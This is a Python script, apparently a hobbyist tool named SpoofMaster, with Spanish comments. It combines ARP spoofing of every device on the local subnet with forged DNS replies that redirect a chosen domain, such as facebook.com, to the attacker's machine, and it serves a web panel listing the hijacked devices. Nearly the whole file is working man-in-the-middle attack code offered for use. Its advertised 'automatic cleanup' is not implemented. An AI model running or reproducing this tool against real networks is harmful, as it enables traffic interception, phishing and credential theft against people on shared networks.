
#!/usr/bin/env python3

import os
import sys
import time
import json
import signal
import socket
import struct
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

try:
    from scapy.all import *
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether, ARP
    from scapy.layers.dns import DNS, DNSQR, DNSRR
except ImportError:
    print("❌ Error: Scapy no está instalado")
    print("Instala con: pip3 install scapy")
    sys.exit(1)

class SpoofMaster:
    def __init__(self, target_domain):
        self.target_domain = target_domain
        self.local_ip = None
        self.interface = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_mac = None
        self.is_running = False
        self.stats = {
            'dns_requests': 0,
            'arp_packets': 0,
            'start_time': datetime.now(),
            'target_domain': target_domain,
            'local_ip': '',
            'gateway_ip': '',
            'spoofed_devices': []  # Ahora será una lista de diccionarios
        }
        self.web_server = None
        self.devices_lock = threading.Lock()
        
    def show_banner(self):
        print("""
    ================================================================
    |               SpoofMaster v2.0 by OIHEC                     |
    |              DNS & ARP Spoofing Tool Avanzado               |
    ================================================================
        """)
    
    def show_menu(self):
        print("================================================")
        print("Uso: sudo python3 spoofmaster2.py <dominio.com>")
        print("Ejemplo: sudo python3 spoofmaster2.py facebook.com")
        print("")
        print("Características:")
        print("• DNS Spoofing avanzado")
        print("• ARP Spoofing automático")
        print("• Panel web de control (puerto 8080)")
        print("• Estadísticas en tiempo real")
        print("• Limpieza automática al salir")
        print("• Detección de dispositivos mejorada")
        print("================================================")
        
    def detect_network_config(self):
        """Detecta la configuración de red automáticamente"""
        try:
            # Obtener IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            
            self.stats['local_ip'] = self.local_ip
            
            # Obtener interfaz de red
            self.interface = conf.iface
            
            # Obtener gateway
            self.gateway_ip = conf.route.route("0.0.0.0")[2]
            self.stats['gateway_ip'] = self.gateway_ip
            
            # Obtener MAC del gateway
            self.gateway_mac = getmacbyip(self.gateway_ip)
            
            # Obtener MAC local
            self.local_mac = get_if_hwaddr(self.interface)
            
            print(f"✅ IP Local: {self.local_ip}")
            print(f"✅ Interfaz: {self.interface}")
            print(f"✅ Gateway: {self.gateway_ip} ({self.gateway_mac})")
            print(f"✅ MAC Local: {self.local_mac}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error detectando configuración de red: {e}")
            return False
    
    def dns_spoof_handler(self, packet):
        """Maneja las peticiones DNS y las falsifica"""
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Es una query
            self.stats['dns_requests'] += 1
            
            # Verificar si la consulta es para nuestro dominio objetivo
            query_name = packet[DNSQR].qname.decode().rstrip('.')
            if self.target_domain in query_name:
                print(f"🎯 DNS Spoofed: {query_name} -> {self.local_ip}")
                
                # Crear respuesta DNS falsa
                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                              UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                              DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                  an=DNSRR(rrname=packet[DNSQR].qname, ttl=60, rdata=self.local_ip))
                
                send(dns_response, verbose=0)
    
    def start_dns_spoofing(self):
        """Inicia el spoofing DNS"""
        print("📡 Iniciando servidor DNS falso...")
        try:
            sniff(filter="udp port 53", prn=self.dns_spoof_handler, iface=self.interface, store=0)
        except Exception as e:
            print(f"❌ Error en DNS spoofing: {e}")
    
    def send_arp_spoof(self, target_ip, target_mac):
        """Envía paquetes ARP falsos"""
        try:
            # ARP reply falso: le dice al objetivo que somos el gateway
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                             psrc=self.gateway_ip, hwsrc=self.local_mac)
            send(arp_response, verbose=0)
            
            # ARP reply falso: le dice al gateway que somos el objetivo
            arp_response2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                              psrc=target_ip, hwsrc=self.local_mac)
            send(arp_response2, verbose=0)
            
            self.stats['arp_packets'] += 2
            
        except Exception as e:
            print(f"❌ Error enviando ARP spoof: {e}")
    
    def discover_devices(self):
        """Descubre dispositivos en la red"""
        try:
            network = ".".join(self.local_ip.split(".")[:-1]) + ".0/24"
            print(f"🔍 Escaneando red: {network}")
            
            # Crear petición ARP para toda la red
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Enviar y recibir respuestas
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            devices = []
            with self.devices_lock:
                for element in answered_list:
                    device = {
                        'ip': element[1].psrc,
                        'mac': element[1].hwsrc
                    }
                    devices.append(device)
                    
                    # Agregar a dispositivos spoofed si no está ya
                    device_exists = False
                    for existing_device in self.stats['spoofed_devices']:
                        if existing_device['ip'] == device['ip']:
                            device_exists = True
                            break
                    
                    if not device_exists:
                        self.stats['spoofed_devices'].append(device)
            
            return devices
            
        except Exception as e:
            print(f"❌ Error descubriendo dispositivos: {e}")
            return []
    
    def start_arp_spoofing(self):
        """Inicia el spoofing ARP"""
        print("🔄 Iniciando ARP spoofing...")
        
        while self.is_running:
            try:
                # Descubrir dispositivos
                devices = self.discover_devices()
                
                # Spoofear cada dispositivo encontrado
                for device in devices:
                    if device['ip'] != self.local_ip and device['ip'] != self.gateway_ip:
                        self.send_arp_spoof(device['ip'], device['mac'])
                        print(f"🎯 ARP Spoofing: {device['ip']} ({device['mac']})")
                
                time.sleep(3)  # Esperar 3 segundos antes del siguiente ciclo
                
            except Exception as e:
                print(f"❌ Error en ARP spoofing: {e}")
                time.sleep(5)

class WebHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suprimir logs del servidor web
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Crear tabla de dispositivos de forma segura
            devices_table = ""
            with spoofer.devices_lock:
                for device in spoofer.stats['spoofed_devices']:
                    devices_table += f"<tr><td>{device['ip']}</td><td>{device['mac']}</td></tr>"
            
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SpoofMaster - Panel de Control</title>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; text-align: center; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }}
        .stat-card {{ background: #e9ecef; padding: 15px; border-radius: 5px; text-align: center; }}
        .stat-value {{ font-size: 24px; font-weight: bold; color: #007bff; }}
        .stat-label {{ font-size: 14px; color: #666; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f8f9fa; }}
        .status {{ padding: 5px 10px; border-radius: 3px; background-color: #d4edda; color: #155724; }}
        .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }}
        .info-section {{ background: #f8f9fa; padding: 15px; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 SpoofMaster v2.0</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{spoofer.stats['dns_requests']}</div>
                <div class="stat-label">Peticiones DNS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{spoofer.stats['arp_packets']}</div>
                <div class="stat-label">Paquetes ARP</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(spoofer.stats['spoofed_devices'])}</div>
                <div class="stat-label">Dispositivos Spoofed</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{spoofer.stats['target_domain']}</div>
                <div class="stat-label">Dominio Objetivo</div>
            </div>
        </div>
        
        <div class="info-grid">
            <div class="info-section">
                <h3>Configuración de Red</h3>
                <p><strong>IP Local:</strong> {spoofer.stats['local_ip']}</p>
                <p><strong>Gateway:</strong> {spoofer.stats['gateway_ip']}</p>
                <p><strong>Interfaz:</strong> {spoofer.interface}</p>
            </div>
            <div class="info-section">
                <h3>Estado del Sistema</h3>
                <p><strong>Inicio:</strong> {spoofer.stats['start_time']}</p>
                <p><strong>Estado:</strong> <span class="status">Activo</span></p>
            </div>
        </div>
        
        <h2>Dispositivos Spoofed</h2>
        <table>
            <tr>
                <th>IP</th>
                <th>MAC</th>
            </tr>
            {devices_table}
        </table>
    </div>
</body>
</html>
            """
            self.wfile.write(html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def signal_handler(sig, frame):
    print('\n🛑 Deteniendo SpoofMaster...')
    spoofer.is_running = False
    if spoofer.web_server:
        spoofer.web_server.shutdown()
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("❌ Uso: sudo python3 spoofmaster2.py <dominio.com>")
        sys.exit(1)
    
    target_domain = sys.argv[1]
    
    # Inicializar el spoof master
    spoofer = SpoofMaster(target_domain)
    
    # Mostrar banner y menú
    spoofer.show_banner()
    spoofer.show_menu()
    
    # Detectar configuración de red
    if not spoofer.detect_network_config():
        print("❌ No se pudo detectar la configuración de red")
        sys.exit(1)
    
    # Configurar señal de interrupción
    signal.signal(signal.SIGINT, signal_handler)
    
    # Iniciar hilos
    spoofer.is_running = True
    
    # Iniciar servidor web en segundo plano
    def start_web_server():
        try:
            spoofer.web_server = HTTPServer(('0.0.0.0', 8080), WebHandler)
            spoofer.web_server.serve_forever()
        except Exception as e:
            print(f"❌ Error iniciando servidor web: {e}")
    
    web_thread = threading.Thread(target=start_web_server, daemon=True)
    web_thread.start()
    
    # Iniciar spoofing en hilos separados
    dns_thread = threading.Thread(target=spoofer.start_dns_spoofing, daemon=True)
    arp_thread = threading.Thread(target=spoofer.start_arp_spoofing, daemon=True)
    
    dns_thread.start()
    arp_thread.start()
    
    print("🚀 SpoofMaster iniciado correctamente!")
    print("🌐 Accede al panel web en: http://localhost:8080")
    print("🛑 Presiona Ctrl+C para detener")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)
